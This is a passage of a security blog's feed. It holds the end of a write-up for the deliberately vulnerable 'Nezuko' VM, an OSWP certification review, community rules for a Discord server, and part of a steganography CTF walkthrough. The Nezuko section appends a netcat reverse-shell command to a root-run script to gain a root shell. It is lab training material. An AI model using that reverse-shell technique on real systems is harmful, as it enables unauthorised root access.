+    &lt;p&gt;to_nezuko : contains a bash script owned by zenitsu that will send a message to nezuko.&lt;/p&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;However, upon further inspection, we found out that the script is being run by &lt;code class=&quot;highlighter-rouge&quot;&gt;root&lt;/code&gt; instead. That’s why the messages sent to nezuko home directory are owned by &lt;code class=&quot;highlighter-rouge&quot;&gt;root&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;We can verify it by running&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;nezuko@ubuntu:~#ls &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt; /home/nezuko/from_zenitsu/&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;This means that, we can escalate our current privileges to &lt;code class=&quot;highlighter-rouge&quot;&gt;root&lt;/code&gt; privileges by modifying the content of bash.&lt;/p&gt;
+
+&lt;p&gt;Since the owner of the script is &lt;code class=&quot;highlighter-rouge&quot;&gt;zenitsu&lt;/code&gt; , then it is possible to overwrite the script.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/musubi/assets/vm_nezuko/cannot_change_bash.png&quot; alt=&quot;cannot_change_bash&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;But, it seems that we obtained &lt;code class=&quot;highlighter-rouge&quot;&gt;permission denied&lt;/code&gt; when trying to overwrite the content of the bash script.&lt;/p&gt;
+
+&lt;h3 id=&quot;exploiting-file-attributes&quot;&gt;Exploiting file attributes&lt;/h3&gt;
+
+&lt;p&gt;When running &lt;code class=&quot;highlighter-rouge&quot;&gt;lsattr&lt;/code&gt; on the bash script, it showed that the file attribute of the bash script has been changed to &lt;code class=&quot;highlighter-rouge&quot;&gt;a&lt;/code&gt;(append) mode only. This means we can only append the script but cannot overwrite it.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/musubi/assets/vm_nezuko/lsattr.png&quot; alt=&quot;lsattr&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;With a slight modification to our command, we managed to append our own command which will connect to our Kali.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;zenitsu@ubuntu:~/to_nezuko&lt;span class=&quot;nv&quot;&gt;$echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;nc -e /bin/bash 10.10.10.5 1234&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; send_message_to_nezuko.sh&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Set up our listener to listen on port 1234&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/musubi/assets/vm_nezuko/listener_1234.png&quot; alt=&quot;listener_1234&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;After waiting for couple of minutes for the script to be executed, we managed to get a root shell!&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/musubi/assets/vm_nezuko/root.png&quot; alt=&quot;root&quot; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;wrap-up&quot;&gt;Wrap up&lt;/h3&gt;
+
+&lt;p&gt;Thank you for taking your time to read the writeup and I hope you enjoyed playing with my first vm. :&amp;gt;&lt;/p&gt;
+
+&lt;p&gt;Check out also &lt;a href=&quot;/musubi/others/vm_aqua&quot;&gt;vm_aqua&lt;/a&gt;&lt;/p&gt;</content><author><name>yunaranyancat</name></author><summary type="html">Hi there. This is my boot2root writeup for a vm called “Nezuko”. For those who didn’t manage to play with it, download the vm and come back when you have finished.</summary></entry><entry><title type="html">From 0 to OSWP</title><link href="http://localhost:4000/musubi/others/oswpreview" rel="alternate" type="text/html" title="From 0 to OSWP" /><published>2019-03-18T00:00:00+08:00</published><updated>2019-03-18T00:00:00+08:00</updated><id>http://localhost:4000/musubi/others/OSWP_Review</id><content type="html" xml:base="http://localhost:4000/musubi/others/oswpreview">&lt;p&gt;Heyyy guys, what’s up. Few days ago I just received a mail from Offsec saying that I have passed the Offensive Security Wireless Professional exam. So I’m thinking about writing my OSWP journey from start until end.&lt;/p&gt;
+
+&lt;h3 id=&quot;about-wifuv3&quot;&gt;About WiFuv3&lt;/h3&gt;
+
+&lt;p&gt;&lt;img src=&quot;/musubi/assets/oswp/wifu.jpeg&quot; alt=&quot;WiFu&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Supposed that you have read everything listed in this &lt;a href=&quot;https://www.offensive-security.com/information-security-training/offensive-security-wireless-attacks/&quot;&gt;page&lt;/a&gt; , WiFu course is aimed for those who wanted to;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Know in depth about how 802.11 networks work&lt;/li&gt;
+  &lt;li&gt;Execute attacks related to WEP, WPA/WPA2&lt;/li&gt;
+  &lt;li&gt;Learn tools like Aircrack-ng, Pyrit, Kismet etc..&lt;/li&gt;
+  &lt;li&gt;Prepare your own home based lab related to WiFi hacking&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&quot;requirements&quot;&gt;Requirements&lt;/h3&gt;
+
+&lt;p&gt;You’ll need to have some experience in basic Linux commands, understand basic TCP/IP and OSI model.&lt;/p&gt;
+
+&lt;p&gt;Other than that, unlike OSCP or other Offsec courses, you’ll need to set up your home lab to follow along with the course. The recommended setup is available on the site, but for me, I used:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;D-Link DIR 601 router&lt;/li&gt;
+  &lt;li&gt;ALFA AWUS036NHA wifi card&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&quot;getting-started&quot;&gt;Getting Started&lt;/h3&gt;
+
+&lt;p&gt;I received my course content on Wednesday, 6 March. Actually I was expecting to receive them earlier, and it seemed like my first purchase attempt was failed. Make sure you do not add any symbol on the phone number. I think maybe it was because I added +33 in front of my phone number. So, I contacted Offsec and made a second purchase. Don’t worry, if you accidentally purchased the course more than two times, you can send a message to Offsec for a refund.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/musubi/assets/oswp/failpurchase.png&quot; alt=&quot;fail&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;You will be given a BackTrack ISO, PDF and videos. Since it is recommended to use the given ISO, so I opted out with that ISO. Although at first, I encountered some problems setting up my wifi card to work with it. Maybe it was because I was using VirtualBox instead of VMWare. If you are using the same setup as me and you encounter some problems, feel free to send me a message.&lt;/p&gt;
+
+&lt;h3 id=&quot;why-i-choose-this-course&quot;&gt;Why I choose this course&lt;/h3&gt;
+
+&lt;p&gt;Firstly, I wanted to learn more about Wireless network and security. I wanted to know what made them insecure and how to protect against different attacks. Secondly, I didn’t save up much money , where at first I wanted to do OSCP. Since I saw that this one is cheaper (450USD), and easier than OSCP, then I thought to myself, maybe I can take this first then do OSCP, or maybe I just want to procrastinate. :x&lt;/p&gt;
+
+&lt;h3 id=&quot;lets-go&quot;&gt;Let’s GO!&lt;/h3&gt;
+
+&lt;p&gt;I started by reading the PDF contents before jumping to the videos. At first, you will be introduced to some WiFi theories, 802.11 families , etc. It might sound boring and you may feel that you wanted to jump directly to hacking the WiFi. But, trust me, you wouldn’t want to skip those theories. Even if it won’t help you in the lab later, you won’t get the most out of the WiFu course and it’s not really worth it to skip these learning.&lt;/p&gt;
+
+&lt;p&gt;But if you are a pro master hacker who can hack every WiFi network in this world, so you can jump directly to videos and play with your lab. Hehe&lt;/p&gt;
+
+&lt;p&gt;After reading those theories, I directly jumped to watching videos. For me, I only focus on finishing the videos while using the PDF as my reference. So, I use both of them at the same time and it’s quite efficient I suppose?&lt;/p&gt;
+
+&lt;h3 id=&quot;booking-for-exam&quot;&gt;Booking For Exam&lt;/h3&gt;
+
+&lt;p&gt;Once I feel confident about passing the exam, I went to the site and booked for the exam which will be held on March 18. But, when it seemed like I started to procrastinate, I changed the booking date to be earlier, which is on March 14. Then, I spent the remaining days repeating different attacks in my home lab with different security level.&lt;/p&gt;
+
+&lt;h3 id=&quot;exam-day&quot;&gt;Exam Day&lt;/h3&gt;
+
+&lt;p&gt;You will be given 3 hours 54 minutes to complete the exam. There are three different APs with different security level and you need to get the keys using various attacks.&lt;/p&gt;
+
+&lt;p&gt;I was able to solve all of the challenges without any problem and then I managed to send the exam report on the same day.&lt;/p&gt;
+
+&lt;p&gt;The secret ingredient to pass the exam is &lt;code class=&quot;highlighter-rouge&quot;&gt;don't forget what you have done in the lab&lt;/code&gt;. :D&lt;/p&gt;
+
+&lt;h3 id=&quot;oswp-certified-hype-day&quot;&gt;OSWP Certified Hype Day&lt;/h3&gt;
+
+&lt;p&gt;The next day, I received the email saying that I passed the exam and got certified.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/musubi/assets/oswp/email.png&quot; alt=&quot;email&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Thank you for reading the post and if you have any further question related to OSWP (no spoiler ofc), feel free to send me a message. See you next time. :)&lt;/p&gt;</content><author><name>yunaranyancat</name></author><summary type="html">Heyyy guys, what’s up. Few days ago I just received a mail from Offsec saying that I have passed the Offensive Security Wireless Professional exam. So I’m thinking about writing my OSWP journey from start until end.</summary></entry><entry><title type="html">Elite Ghost Discord Server</title><link href="http://localhost:4000/musubi/others/EG_Discord_MY" rel="alternate" type="text/html" title="Elite Ghost Discord Server" /><published>2019-03-16T00:00:00+08:00</published><updated>2019-03-16T00:00:00+08:00</updated><id>http://localhost:4000/musubi/others/discord-EG</id><content type="html" xml:base="http://localhost:4000/musubi/others/EG_Discord_MY">&lt;p&gt;Hello pentesters and hackers from Malaysia,&lt;/p&gt;
+
+&lt;h2 id=&quot;intro&quot;&gt;Intro&lt;/h2&gt;
+
+&lt;p&gt;I would like to invite you guys to join our Discord server.&lt;/p&gt;
+
+&lt;p&gt;Click here to join : &lt;a href=&quot;https://discord.gg/KPUXr2u&quot;&gt;https://discord.gg/KPUXr2u&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/musubi/assets/discord/discord.png&quot; alt=&quot;discord&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;The main reason why I would like to create this post is to list all the rules for those who are currently applying to join our Discord server. This is to avoid spam, posts that violate rules and other things that might make things worst.&lt;/p&gt;
+
+&lt;h2 id=&quot;general-rules&quot;&gt;General Rules&lt;/h2&gt;
+
+&lt;h3 id=&quot;1-follow-the-rules&quot;&gt;1. Follow the rules&lt;/h3&gt;
+
+&lt;p&gt;Rules are created to maintain harmony between Discord users. Follow the rules and you can enjoy our Discord server.&lt;/p&gt;
+
+&lt;h3 id=&quot;2-rudeness--offensive-language&quot;&gt;2. Rudeness &amp;amp; Offensive Language&lt;/h3&gt;
+
+&lt;p&gt;This Discord server is aimed for all range of users. Even students below 18 years old are welcomed so that they can learn at an early stage. Do not use curse/bad languages. If you’re being caught by the Mods, you’ll be kicked out from the server or get your roles removed for a period of time.&lt;/p&gt;
+
+&lt;h3 id=&quot;3-welcoming--patience&quot;&gt;3. Welcoming &amp;amp; Patience&lt;/h3&gt;
+
+&lt;p&gt;Not all of us are pro pentesters, veterans, master hackers or 1337. Please don’t make users feel unwelcomed or unappreciated.&lt;/p&gt;
+
+&lt;h3 id=&quot;4-drama--arguments&quot;&gt;4. Drama &amp;amp; Arguments&lt;/h3&gt;
+
+&lt;p&gt;Please refrain yourself from causing a huge drama or arguments. You can simply block the user(s) if you don’t like them.&lt;/p&gt;
+
+&lt;h3 id=&quot;5-privacy&quot;&gt;5. Privacy&lt;/h3&gt;
+
+&lt;p&gt;Please respect others privacy. Asking personal questions should be done between only you and the person in question. Send them a PM if they’re available. And don’t PM them if they have set their status as unavailable!&lt;/p&gt;
+
+&lt;h2 id=&quot;server-rules&quot;&gt;Server Rules&lt;/h2&gt;
+
+&lt;p&gt;Once you have joined our Discord, please wait some time for Mods to give you a role. If you think that your roles are irrelevant, please do not hesitate to send Mods a PM. And do introduce yourself inside the #welcoming-mat channel.&lt;/p&gt;
+
+&lt;h3 id=&quot;1-mods-pinging&quot;&gt;1. Mods pinging&lt;/h3&gt;
+
+&lt;p&gt;Please do not ping Moderators unless you have a very urgent problem. If you would like to report a user(s), send Mods a PM alongside the screenshot(s) of them breaking the rules.&lt;/p&gt;
+
+&lt;h3 id=&quot;2-channel-relevance&quot;&gt;2. Channel relevance&lt;/h3&gt;
+
+&lt;p&gt;Please do not SPAM bots (KawaiiBot / Rythm) outside of #bot-spam-and-welcoming-mat text channel. Repeated spamming outside the appropriate channel will result in a temporary ban.&lt;/p&gt;
+
+&lt;p&gt;Only post contents in RELEVANT channels.&lt;/p&gt;
+
+&lt;p&gt;Rythm&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;Rythm is a music bot, if you want to listen to the music or request a music, join &lt;code class=&quot;highlighter-rouge&quot;&gt;music listening&lt;/code&gt; voice channel and see available commands by typing &lt;code class=&quot;highlighter-rouge&quot;&gt;!help&lt;/code&gt; in #bot-spam text channel. Please do not spam music requests or skip currently playing music (if you are alone inside the voice channel, then you can do so). And mute your mic in the channel. &amp;gt;.&amp;lt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;KawaiiBot&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;Type &lt;code class=&quot;highlighter-rouge&quot;&gt;+help&lt;/code&gt; in #bot-spam channel and you can spam anything inside the channel. But please do not &lt;strong&gt;MEGA SPAM&lt;/strong&gt;. Plzzzzzzz. :3&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&quot;3-illegal-content--topics&quot;&gt;3. Illegal Content &amp;amp; Topics&lt;/h3&gt;
+
+&lt;p&gt;Please refrain from discussing any unlawful actions, this is not the place to tell people about your blackhat actions, it’s also not very smart. In addition to this, please do not ask anyone to break the law for you, this is not a blackhat recruitment area, we try to maintain a professional environment &amp;amp; discussion of such topics is not professional. Finally, refrain from posting unlawfully gathered content &amp;amp; links to such content, #resources-sharing is there for legally obtained material to be posted (no this does not mean you can share a book because you bought it)&lt;/p&gt;
+
+&lt;p&gt;Do not post Torrents or any illegal websites, failure to do so will result in temporary ban. There might be professionals who are working with the polices here.&lt;/p&gt;
+
+&lt;h3 id=&quot;4-please-use-english--malay-at-all-times&quot;&gt;4. Please use English / Malay at all times.&lt;/h3&gt;
+
+&lt;p&gt;If you want to use other languages, it is better to do it outside of the channels. This is not a form of discrimination, rather than encouraging people to communicate actively using well known and common languages.&lt;/p&gt;
+
+&lt;h3 id=&quot;5-tos&quot;&gt;5. TOS&lt;/h3&gt;
+
+&lt;p&gt;Think before you do anything. We are obligated to operate under Discord TOS too so please make sure that you have fully understood and agreed to those terms.&lt;/p&gt;
+
+&lt;h3 id=&quot;6-unspoken-rules&quot;&gt;6. Unspoken rules&lt;/h3&gt;
+
+&lt;p&gt;If you think it’s wrong, then it’s wrong. There is no justification.&lt;/p&gt;
+
+&lt;p&gt;Thank you. :D&lt;/p&gt;</content><author><name>yunaranyancat</name></author><summary type="html">Hello pentesters and hackers from Malaysia,</summary></entry><entry><title type="html">chika01 writeup</title><link href="http://localhost:4000/musubi/others/chika01" rel="alternate" type="text/html" title="chika01 writeup" /><published>2019-03-15T00:00:00+08:00</published><updated>2019-03-15T00:00:00+08:00</updated><id>http://localhost:4000/musubi/others/ctf-chika01</id><content type="html" xml:base="http://localhost:4000/musubi/others/chika01">&lt;p&gt;Hello guys,&lt;/p&gt;
+
+&lt;h2 id=&quot;intro&quot;&gt;Intro&lt;/h2&gt;
+
+&lt;p&gt;I have created my first ctf challenge called &lt;a href=&quot;https://github.com/yunaranyancat/cryptoalltheway/blob/master/chika01.zip&quot;&gt;chika01&lt;/a&gt; for my friends to play with. And since it has been like a week or more since I created the challenge, I think it’s time to do the writeup about it. If you have not solved it yet and wanted to give it a try, stop scrolling, download the challenge and get the secret key! ;&amp;gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;walktrough&quot;&gt;Walktrough&lt;/h2&gt;
+
+&lt;h3 id=&quot;-getting-the-key-for-chikasecretmessagezip-&quot;&gt;&lt;u&gt; getting the key for chikasecretmessage.zip &lt;/u&gt;&lt;/h3&gt;
+
+&lt;p&gt;When we unzip the file, we will be shown with 4 files.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/musubi/assets/chika01/intro.png&quot; alt=&quot;intro&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;The zip file is currently password protected, so we need to find a way to unlock it.&lt;/p&gt;
+
+&lt;p&gt;The first image is &lt;code class=&quot;highlighter-rouge&quot;&gt;chikarobotdance.png&lt;/code&gt;. If we do &lt;code class=&quot;highlighter-rouge&quot;&gt;strings&lt;/code&gt; command or &lt;code class=&quot;highlighter-rouge&quot;&gt;binwalk&lt;/code&gt;, we will find nothing there. Maybe it’s just a bait for making this challenge looks harder?&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/musubi/assets/chika01/chikarobotdance.png&quot; alt=&quot;chikarobotdance&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;The second image is &lt;code class=&quot;highlighter-rouge&quot;&gt;praisekawaiichikapls.png&lt;/code&gt;. If we look closely, at the lower right of the image, there is a text which seems like showing the password for the zip file, &lt;code class=&quot;highlighter-rouge&quot;&gt;loveiswar&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/musubi/assets/chika01/praisechikapls.png&quot; alt=&quot;praisekawaiichikapls&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;and when we try to unzip it, the password didn’t work. So no praise for chika this time. ;{&lt;/p&gt;
+
+&lt;p&gt;And the last one is a text file. If we look closely, there are only 4 words that are repeated multiple times, &lt;code class=&quot;highlighter-rouge&quot;&gt;dash&lt;/code&gt; , &lt;code class=&quot;highlighter-rouge&quot;&gt;space&lt;/code&gt; , &lt;code class=&quot;highlighter-rouge&quot;&gt;dot&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;slash&lt;/code&gt; .&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/musubi/assets/chika01/randomerror.png&quot; alt=&quot;morse&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;It is actually a &lt;code class=&quot;highlighter-rouge&quot;&gt;morse code&lt;/code&gt; that being translated literally from symbols to their own respective words. So, using a simple python code I wrote below, it will help us translate the words back.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span class=&quot;n&quot;&gt;f&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;random_ERROR.txt&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;r&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;fl&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;readlines&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;text&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;text&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;text&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;replace&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;dash&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;-&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;replace&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;space&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot; &quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;replace&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;slash&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;replace&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;dot&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;.&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;and we will have something like this,&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;- .... . / ... . -.-. .-. . - .- .-. -.-- / --- ..-. / - .... . / ... .... ..- -.-. .... .. .. -. / .- -.-. .- -.. . -- -.-- / ... - ..- -.. . -. - / -.-. --- ..- -. -.-. .. .-.. .-.-.- / ... .... . .----. ... / -... . . -. / ..-. .-. .. . -. -.. ... / .-- .. - .... / ... .... .. -. --- -- .. -.-- .- / ... .. -. -.-. . / -- .. -.. -.. .-.. . / ... -.-. .... --- --- .-.. .-.-.- / ... .... . .----. ... / -.. .. - --.. -.-- / .- -. -.. / .-.. .. -.- . ... / - --- / --. --- ... ... .. .--. --..-- / .- -. -.. / --- ..-. - . -. / - .... .-. --- .-- ... / .- / .-- .-. . -. -.-. .... / .. -. / ... .... .. -. --- -- .. -.-- .- / .- -. -.. / ... .... .. .-. --- --. .- -. . .----. ... / .--. .-.. .- -. ... / -.. ..- . / - --- / .... . .-. / ..- -. .--. .-. . -.. .. -.-. - .- -... .. .-.. .. - -.-- .-.-.- / . ...- . -. / ... --- --..-- / ... .... . .----. ... / --.- ..- .. - . / .- / -... .. - / -- --- .-. . / .-- . .-.. .-.. -....- .- -.. .--- ..- ... - . -.. / - .... .- -. / .... . .-. / ..-. . .-.. .-.. --- .-- / ... - ..- -.. . -. - / -.-. --- ..- -. -.-. .. .-.. / -- . -- -... . .-. ... / .- -. -.. / ... --- -- . - .. -- . ... / - .- -.- . ... / .. - / ..- .--. --- -. / .... . .-. ... . .-.. ..-. / - --- / - . .- -.-. .... / - .... . -- / .... --- .-- / - --- / --- ...- . .-. -.-. --- -- . / - .... . .. .-. / ... .... --- .-. - -.-. --- -- .. -. --. ... .-.-.- / - .... . / .--. .- ... ... .-- --- .-. -.. / .. ... / .-..-. .-.. --- ...- . .. ... .. -. -.. . . -.. .- .-- .- .-. .-..-. .-.-.- / - --- / .- ...- --- .. -.. / - .-. -.-- / .- -. -.. / . .-. .-. --- .-. --..-- / - .... . / .--. .- ... ... .-- --- .-. -.. / .. ... / .. -. / -.-. .- .--. .. - .- .-.. / .-.. . - - . .-. .-.-.- / - .... . / - . -..- - / -... . ..-. --- .-. . / .. ... / .--- ..- ... - / - --- / . -. -.-. --- ..- .-. .- --. . / .--. . --- .--. .-.. . / - --- / .- ..- - --- -- .- - . / - .... . / -.-. --- -. ...- . .-. ... .. --- -. / --- ..-. / - .... . / -.-. --- -.. . / .. -. ... - . .- -.. / --- ..-. / -.. --- .. -. --. / .. - / -- .- -. ..- .- .-.. .-.. -.-- .-.-.- / .. - .----. ... / . .- ... -.-- --..-- / .-. . .- .-.. .-.. -.-- .-.-.-&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;Using this &lt;a href=&quot;https://morsecode.scphillips.com/translator.html&quot;&gt;site&lt;/a&gt; for example, we will get this text.&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;THE SECRETARY OF THE SHUCHIIN ACADEMY STUDENT COUNCIL. SHE'S BEEN FRIENDS WITH SHINOMIYA SINCE MIDDLE SCHOOL. SHE'S DITZY AND LIKES TO GOSSIP, AND OFTEN THROWS A WRENCH IN SHINOMIYA AND SHIROGANE'S PLANS DUE TO HER UNPREDICTABILITY. EVEN SO, SHE'S QUITE A BIT MORE WELL-ADJUSTED THAN HER FELLOW STUDENT COUNCIL MEMBERS AND SOMETIMES TAKES IT UPON HERSELF TO TEACH THEM HOW TO OVERCOME THEIR SHORTCOMINGS. THE PASSWORD IS &quot;LOVEISINDEEDAWAR&quot;. TO AVOID TRY AND ERROR, THE PASSWORD IS IN CAPITAL LETTER. THE TEXT BEFORE IS JUST TO ENCOURAGE PEOPLE TO AUTOMATE THE CONVERSION OF THE CODE INSTEAD OF DOING IT MANUALLY. IT'S EASY, REALLY.&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;We can now unzip the file.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;unzip chikasecretmessage.zip
+when prompted with password, insert &lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;LOVEISINDEEDAWAR&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;.&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;h3 id=&quot;-extracting-secret-file-from-image-&quot;&gt;&lt;u&gt; extracting secret file from image &lt;/u&gt;&lt;/h3&gt;
+
+&lt;p&gt;The first one is another image named &lt;code class=&quot;highlighter-rouge&quot;&gt;chikafujiwara.jpg&lt;/code&gt;,&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/musubi/assets/chika01/sadchika.png&quot; alt=&quot;sadchika&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;A quick &lt;code class=&quot;highlighter-rouge&quot;&gt;binwalk&lt;/code&gt; command will show us that there is a file hidden inside the image. So, we can then extract it using &lt;code class=&quot;highlighter-rouge&quot;&gt;binwalk&lt;/code&gt; or &lt;code class=&quot;highlighter-rouge&quot;&gt;zip&lt;/code&gt;&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;unzip chikafujiwara.jpg&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;&lt;img src=&quot;/musubi/assets/chika01/binwalk.png&quot; alt=&quot;binwalk&quot; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;-reading-between-the-lines-&quot;&gt;&lt;u&gt; reading between the lines &lt;/u&gt;&lt;/h3&gt;
+
+&lt;p&gt;&lt;img src=&quot;/musubi/assets/chika01/unlocked.png&quot; alt=&quot;unlock&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;and then we get a new gpg encrypted file named &lt;code class=&quot;highlighter-rouge&quot;&gt;key.txt.gpg&lt;/code&gt;. So, since we didn’t have any password for the encrypted file, we can then try to get something useful from &lt;code class=&quot;highlighter-rouge&quot;&gt;whatsapp.log&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/musubi/assets/chika01/conv.png&quot; alt=&quot;conversation&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;The log files showed us what it seems like a conversation of &lt;code class=&quot;highlighter-rouge&quot;&gt;chika&lt;/code&gt; with another person named &lt;code class=&quot;highlighter-rouge&quot;&gt;yunara&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;At first glance of the conversation header, the &lt;code class=&quot;highlighter-rouge&quot;&gt;fingerprint&lt;/code&gt; data looks like it is a base64 encoding.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/musubi/assets/chika01/base64.png&quot; alt=&quot;basedecode&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Using site like &lt;a href=&quot;https://www.base64decode.org/&quot;&gt;https://www.base64decode.org/&lt;/a&gt; , we can see the clear text message. The decoded message is&lt;/p&gt;
+
